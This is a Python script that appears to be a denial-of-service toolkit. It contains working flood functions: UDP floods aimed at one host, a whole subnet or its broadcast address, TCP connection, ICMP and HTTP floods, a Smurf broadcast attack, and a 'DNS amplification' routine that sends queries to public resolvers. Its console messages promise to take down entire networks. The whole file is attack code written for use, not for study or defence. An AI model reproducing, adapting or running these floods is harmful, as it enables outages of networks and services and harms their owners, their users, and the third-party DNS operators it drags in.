import socket
import random
import threading
import time
import struct
import ipaddress

def udp_flood(target_ip, target_port, duration, threads_count):
    print(f"[*] Starting AGGRESSIVE UDP flood on {target_ip}:{target_port} for {duration} seconds with {threads_count} threads")
    
    end_time = time.time() + duration
    
    stop_event = threading.Event()
    total_packets = [0]
    packet_lock = threading.Lock()
    
    def flood(thread_id):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 10)
            sock.setblocking(False)
            
            packets = []
            for _ in range(50):
                packet_size = random.randint(1400, 65000)
                packets.append(random._urandom(packet_size))
            
            local_count = 0
            
            while not stop_event.is_set() and time.time() < end_time:
                for packet in packets:
                    for _ in range(5):
                        try:
                            sock.sendto(packet, (target_ip, target_port))
                            local_count += 1
                        except BlockingIOError:
                            pass
                        except:
                            pass
            
            with packet_lock:
                total_packets[0] += local_count
            
            sock.close()
            print(f"[*] Thread {thread_id} finished - sent {local_count:,} packets")
            
        except Exception as e:
            print(f"[-] Thread {thread_id} error: {e}")
    
    threads = []
    for i in range(threads_count):
        thread = threading.Thread(target=flood, args=(i,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    start_time = time.time()
    last_packets = 0
    last_time = start_time
    
    while time.time() < end_time and not stop_event.is_set():
        time.sleep(1)
        elapsed = time.time() - start_time
        with packet_lock:
            current_packets = total_packets[0]
        
        pps = (current_packets - last_packets) / (time.time() - last_time) if (time.time() - last_time) > 0 else 0
        
        print(f"\r[*] {int(elapsed)}/{duration}s | Total: {current_packets:,} pkts | Current Rate: {pps:.0f} pps", end='', flush=True)
        
        last_packets = current_packets
        last_time = time.time()
    
    print("\n[*] Stopping attack threads...")
    stop_event.set()
    
    for thread in threads:
        thread.join(timeout=2)
    
    print(f"\n[+] UDP flood completed - Total packets: {total_packets[0]:,}")

def network_wide_udp_flood(target_network, target_port, duration, threads_count):
    """Floods EVERY device on the network simultaneously"""
    print(f"[*] Starting NETWORK-WIDE UDP flood on {target_network} port {target_port}")
    print(f"[*] This will affect ALL devices on the network!")
    
    try:
        network = ipaddress.ip_network(target_network, strict=False)
        hosts = list(network.hosts())[:50]
    except:
        hosts = [target_network]
    
    end_time = time.time() + duration
    stop_event = threading.Event()
    total_packets = [0]
    packet_lock = threading.Lock()
    
    def flood(thread_id):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 10)
        sock.setblocking(False)
        
        packet = random._urandom(65000)
        local_count = 0
        
        while not stop_event.is_set() and time.time() < end_time:
            for host in hosts:
                try:
                    sock.sendto(packet, (str(host), target_port))
                    local_count += 1
                except:
                    pass
        
        with packet_lock:
            total_packets[0] += local_count
        sock.close()
    
    threads = []
    for i in range(threads_count):
        thread = threading.Thread(target=flood, args=(i,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    start_time = time.time()
    while time.time() < end_time and not stop_event.is_set():
        time.sleep(1)
        elapsed = time.time() - start_time
        with packet_lock:
            print(f"\r[*] {int(elapsed)}/{duration}s | Total packets across network: {total_packets[0]:,}", end='', flush=True)
    
    print("\n[*] Stopping attack...")
    stop_event.set()
    for thread in threads:
        thread.join(timeout=2)
    print(f"\n[+] Network-wide flood completed - Total packets: {total_packets[0]:,}")

def broadcast_udp_flood(target_network, target_port, duration, threads_count):
    """Uses broadcast addresses to hit EVERY device at once (amplification)"""
    print(f"[*] Starting BROADCAST UDP flood - This WILL take down the entire network!")
    
    try:
        network = ipaddress.ip_network(target_network, strict=False)
        broadcast_ip = str(network.broadcast_address)
    except:
        broadcast_ip = "192.168.1.255"
    
    end_time = time.time() + duration
    stop_event = threading.Event()
    total_packets = [0]
    
    def flood(thread_id):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 10)
        
        packet = random._urandom(65000)
        local_count = 0
        
        while not stop_event.is_set() and time.time() < end_time:
            for _ in range(10):
                try:
                    sock.sendto(packet, (broadcast_ip, target_port))
                    local_count += 1
                except:
                    pass
        
        total_packets[0] += local_count
        sock.close()
    
    threads = []
    for i in range(threads_count):
        thread = threading.Thread(target=flood, args=(i,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    start_time = time.time()
    while time.time() < end_time and not stop_event.is_set():
        time.sleep(1)
        elapsed = time.time() - start_time
        print(f"\r[*] {int(elapsed)}/{duration}s | Broadcast packets sent: {total_packets[0]:,}", end='', flush=True)
    
    stop_event.set()
    for thread in threads:
        thread.join(timeout=2)
    print(f"\n[+] Broadcast flood completed - {total_packets[0]:,} packets sent to ALL devices")

def dns_amplification_attack(target_ip, duration, threads_count):
    """DNS amplification - small request, HUGE response"""
    print(f"[*] Starting DNS amplification attack on {target_ip}")
    print("[*] This reflects traffic to overwhelm the target")
    
    dns_servers = [
        "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9", "208.67.222.222", "208.67.220.220"
    ]
    
    end_time = time.time() + duration
    stop_event = threading.Event()
    total_packets = [0]
    
    def flood(thread_id):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 10)
        
        query = bytes.fromhex("00000100000100000000000003777777066e6574666c7803636f6d0000010001")
        
        local_count = 0
        
        while not stop_event.is_set() and time.time() < end_time:
            for dns in dns_servers:
                try:
                    sock.sendto(query, (dns, 53))
                    local_count += 1
                except:
                    pass
        
        total_packets[0] += local_count
        sock.close()
    
    threads = []
    for i in range(threads_count):
        thread = threading.Thread(target=flood, args=(i,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    start_time = time.time()
    while time.time() < end_time and not stop_event.is_set():
        time.sleep(1)
        elapsed = time.time() - start_time
        print(f"\r[*] {int(elapsed)}/{duration}s | DNS queries sent: {total_packets[0]:,}", end='', flush=True)
    
    stop_event.set()
    for thread in threads:
        thread.join(timeout=2)
    print(f"\n[+] DNS amplification completed")

def tcp_flood(target_ip, target_port, duration, threads_count):
    print(f"[*] Starting AGGRESSIVE TCP flood on {target_ip}:{target_port} for {duration} seconds with {threads_count} threads")
    
    end_time = time.time() + duration
    
    stop_event = threading.Event()
    total_connections = [0]
    conn_lock = threading.Lock()
    
    def flood(thread_id):
        local_count = 0
        
        while not stop_event.is_set() and time.time() < end_time:
            for _ in range(50):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.0001)
                    s.setblocking(False)
                    try:
                        s.connect((target_ip, target_port))
                        local_count += 1
                    except BlockingIOError:
                        local_count += 1
                    except:
                        pass
                except:
                    pass
        
        with conn_lock:
            total_connections[0] += local_count
        
        print(f"[*] Thread {thread_id} finished - {local_count:,} connection attempts")
    
    threads = []
    for i in range(threads_count * 2):
        thread = threading.Thread(target=flood, args=(i,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    start_time = time.time()
    last_conns = 0
    last_time = start_time
    
    while time.time() < end_time and not stop_event.is_set():
        time.sleep(1)
        elapsed = time.time() - start_time
        with conn_lock:
            current_conns = total_connections[0]
        
        cps = (current_conns - last_conns) / (time.time() - last_time) if (time.time() - last_time) > 0 else 0
        
        print(f"\r[*] {int(elapsed)}/{duration}s | Total: {current_conns:,} conns | Current Rate: {cps:.0f} cps", end='', flush=True)
        
        last_conns = current_conns
        last_time = time.time()
    
    print("\n[*] Stopping attack threads...")
    stop_event.set()
    
    for thread in threads:
        thread.join(timeout=1)
    
    print(f"\n[+] TCP flood completed - Total connection attempts: {total_connections[0]:,}")

def icmp_flood(target_ip, duration, threads_count):
    print(f"[*] Starting ICMP flood on {target_ip} for {duration} seconds with {threads_count} threads")
    
    end_time = time.time() + duration
    
    stop_event = threading.Event()
    total_packets = [0]
    packet_lock = threading.Lock()
    
    def flood(thread_id):
        local_count = 0
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 10)
        except PermissionError:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 10)
        
        packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(1400)
        
        while not stop_event.is_set() and time.time() < end_time:
            for _ in range(20):
                try:
                    sock.sendto(packet, (target_ip, 0))
                    local_count += 1
                except:
                    pass
        
        sock.close()
        
        with packet_lock:
            total_packets[0] += local_count
        
        print(f"[*] Thread {thread_id} finished - sent {local_count:,} packets")
    
    threads = []
    for i in range(threads_count):
        thread = threading.Thread(target=flood, args=(i,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    start_time = time.time()
    last_packets = 0
    last_time = start_time
    
    while time.time() < end_time and not stop_event.is_set():
        time.sleep(1)
        elapsed = time.time() - start_time
        with packet_lock:
            current_packets = total_packets[0]
        
        pps = (current_packets - last_packets) / (time.time() - last_time) if (time.time() - last_time) > 0 else 0
        
        print(f"\r[*] {int(elapsed)}/{duration}s | Total: {current_packets:,} pkts | Current Rate: {pps:.0f} pps", end='', flush=True)
        
        last_packets = current_packets
        last_time = time.time()
    
    print("\n[*] Stopping attack threads...")
    stop_event.set()
    
    for thread in threads:
        thread.join(timeout=2)
    
    print(f"\n[+] ICMP flood completed - Total packets: {total_packets[0]:,}")

def http_flood(target_ip, duration, threads_count):
    print(f"[*] Starting HTTP flood on {target_ip}:80 for {duration} seconds with {threads_count} threads")
    
    end_time = time.time() + duration
    
    stop_event = threading.Event()
    total_requests = [0]
    req_lock = threading.Lock()
    
    def flood(thread_id):
        local_count = 0
        
        payloads = [
            f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
            f"GET /index.php HTTP/1.1\r\nHost: {target_ip}\r\n\r\n",
            f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 100000\r\n\r\n" + "A" * 100000,
        ]
        
        while not stop_event.is_set() and time.time() < end_time:
            for _ in range(10):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    sock.connect((target_ip, 80))
                    
                    for payload in payloads:
                        sock.send(payload.encode())
                        local_count += 1
                    
                    sock.close()
                except:
                    pass
        
        with req_lock:
            total_requests[0] += local_count
        
        print(f"[*] Thread {thread_id} finished - sent {local_count:,} requests")
    
    threads = []
    for i in range(threads_count):
        thread = threading.Thread(target=flood, args=(i,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    start_time = time.time()
    last_requests = 0
    last_time = start_time
    
    while time.time() < end_time and not stop_event.is_set():
        time.sleep(1)
        elapsed = time.time() - start_time
        with req_lock:
            current_requests = total_requests[0]
        
        rps = (current_requests - last_requests) / (time.time() - last_time) if (time.time() - last_time) > 0 else 0
        
        print(f"\r[*] {int(elapsed)}/{duration}s | Total: {current_requests:,} reqs | Current Rate: {rps:.0f} rps", end='', flush=True)
        
        last_requests = current_requests
        last_time = time.time()
    
    print("\n[*] Stopping attack threads...")
    stop_event.set()
    
    for thread in threads:
        thread.join(timeout=2)
    
    print(f"\n[+] HTTP flood completed - Total requests: {total_requests[0]:,}")

def smurf_attack(target_ip, duration, threads_count):
    print(f"[*] Starting Smurf attack on {target_ip} for {duration} seconds with {threads_count} threads")
    
    broadcast_ips = [
        f"{'.'.join(target_ip.split('.')[:3])}.255",
        '192.168.1.255',
        '10.0.0.255',
        '172.16.255.255',
        '192.168.0.255',
    ]
    
    end_time = time.time() + duration
    
    stop_event = threading.Event()
    total_packets = [0]
    packet_lock = threading.Lock()
    
    def flood(thread_id):
        local_count = 0
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        except PermissionError:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        
        packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(1400)
        
        while not stop_event.is_set() and time.time() < end_time:
            for bc_ip in broadcast_ips:
                for _ in range(5):
                    try:
                        sock.sendto(packet, (bc_ip, 0))
                        local_count += 1
                    except:
                        pass
        
        sock.close()
        
        with packet_lock:
            total_packets[0] += local_count
        
        print(f"[*] Thread {thread_id} finished - sent {local_count:,} packets")
    
    threads = []
    for i in range(threads_count):
        thread = threading.Thread(target=flood, args=(i,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    start_time = time.time()
    last_packets = 0
    last_time = start_time
    
    while time.time() < end_time and not stop_event.is_set():
        time.sleep(1)
        elapsed = time.time() - start_time
        with packet_lock:
            current_packets = total_packets[0]
        
        pps = (current_packets - last_packets) / (time.time() - last_time) if (time.time() - last_time) > 0 else 0
        
        print(f"\r[*] {int(elapsed)}/{duration}s | Total: {current_packets:,} pkts | Current Rate: {pps:.0f} pps", end='', flush=True)
        
        last_packets = current_packets
        last_time = time.time()
    
    print("\n[*] Stopping attack threads...")
    stop_event.set()
    
    for thread in threads:
        thread.join(timeout=2)
    
    print(f"\n[+] Smurf attack completed - Total packets: {total_packets[0]:,}")

def send_packet(target_ip, target_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet_data = random._urandom(1024)
        s.sendto(packet_data, (target_ip, target_port))
        s.close()
    except Exception as e:
        print(f"Failed to send packet")